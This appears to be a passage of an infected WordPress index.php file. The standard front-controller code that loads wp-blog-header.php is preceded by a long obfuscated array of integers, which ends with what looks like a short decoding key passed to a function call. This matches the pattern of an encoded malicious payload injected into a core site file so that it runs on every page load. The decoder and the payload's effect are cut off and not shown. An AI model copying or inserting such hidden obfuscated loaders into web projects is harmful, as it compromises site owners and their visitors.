82, 72, 94, 108, 16, 19, 16, 19, 23, 65, 69, 70, 89, 85, 16, 27, 19, 5, 0, 5, 95, 87, 85, 87, 23, 64, 88, 91, 16, 85, 81, 95, 68, 4, 76, 70, 75, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 65, 5, 95, 87, 85, 19, 10, 65, 65, 2, 85, 80, 95, 87, 82, 5, 94, 108, 16, 19, 16, 19, 23, 65, 69, 70, 77, 57, 16, 19, 23, 65, 24, 108, 58, 19, 16, 19, 23, 78, 74, 70, 125, 86, 93, 81, 82, 19, 22, 15, 88, 88, 81, 93, 23, 21, 4, 1, 16, 99, 120, 99, 23, 20, 11, 18, 69, 88, 16, 88, 82, 3, 16, 18, 69, 91, 81, 93, 23, 4, 19, 7, 92, 27, 25, 57, 23, 65, 69, 70, 20, 80, 95, 87, 82, 65, 88, 70, 64, 65, 85, 84, 104, 19, 0, 22, 92, 82, 83, 86, 31, 70, 74, 56, 108, 64, 26, 15, 107, 94, 77, 89, 10, 67, 88, 67, 30, 94, 74, 15, 23, 31, 16, 20, 16, 77, 69, 66, 83, 92, 84, 86, 30, 90, 111, 70, 16, 19, 16, 23, 84, 14, 1, 3, 16, 14, 16, 67, 69, 4, 2, 57, 66, 86, 64, 95, 86, 2, 0, 78, 23, 28, 108, 12, 9, 61, 22, 76, 20, 28, 23, 31, 23, 70, 66, 74, 16, 23, 83, 92, 83, 4, 76, 93, 58, 19, 16, 19, 23, 69, 6, 9, 84, 86, 16, 14, 23, 21, 23, 15, 93, 27, 20, 80, 88, 5, 0, 79, 11, 57, 58, 19, 23, 65, 69, 73, 31, 19, 124, 82, 89, 6, 22, 19, 94, 84, 16, 89, 86, 13, 4, 8, 91, 82, 94, 19, 92, 14, 1, 3, 94, 74, 81, 19, 83, 8, 69, 11, 85, 94, 95, 65, 94, 107, 69, 70, 16, 19, 85, 69, 86, 13, 77, 66, 83, 92, 84, 86, 30, 90, 111, 27], '037aef03');
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
